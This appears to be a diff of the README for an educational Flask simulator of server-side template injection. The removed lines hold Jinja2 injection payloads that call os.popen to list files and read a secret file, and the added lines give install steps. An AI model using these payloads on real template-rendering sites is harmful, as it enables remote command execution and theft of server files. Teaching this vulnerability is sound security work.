@@ -1,12 +1,11 @@
-# ssti_simulator
+# SSTI_SIMULATOR
 
-## Remote Code Execution through SSTI
-https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+Learn all about a common Python Flask web vulnerability through this interactive simulator.
 
-{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+# Getting Started
 
-{{ request.application.__globals__.__builtins__.__import__('os').popen('cat secrete.txt').read() }}
+First install python3 and pip3 (Python's module manager) if you do not have them on your machine.
 
-## Other Attack, don' know what to call it
-https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
+Next install Flask:
+`pip3 install flask`
 
